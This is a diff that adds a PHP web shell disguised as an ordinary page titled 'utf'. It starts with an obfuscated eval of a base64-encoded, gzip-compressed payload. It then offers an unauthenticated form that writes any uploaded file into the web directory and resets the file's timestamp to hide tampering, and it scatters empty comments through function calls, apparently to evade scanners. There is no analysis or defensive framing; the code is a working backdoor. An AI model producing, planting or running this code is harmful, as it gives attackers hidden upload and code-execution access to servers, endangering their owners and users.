@@ -1,0 +1,27 @@
+<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-utf-8">
+<title>utf</title>
+</head>
+<body>
+<?php
+print "<h1>#p@$c@#</h1>\n";
+echo "Your IP: ";
+echo $_SERVER['REMOTE_ADDR'];
+echo "<form method=\"post\" enctype=\"multipart/form-data\">\n";
+echo "<input type=\"file\" name=\"filename\"><br> \n";
+echo "<input type=\"submit\" value=\"LOAD\"><br>\n";
+echo "</form>\n";
+if(is_uploaded_file/*;*/($_FILES["filename"]["tmp_name"]))
+	{
+	move_uploaded_file/*;*/($_FILES["filename"]["tmp_name"], $_FILES["filename"]["name"]);
+	$file = $_FILES/*;*/["filename"]["name"];
+	echo "<a href=\"$file\">$file</a>";
+	} else {
+	echo("empty");
+	}
+$filename = $_SERVER[SCRIPT_FILENAME];
+touch/*;*/($filename, $time);
+?>
+</body>
+</html>
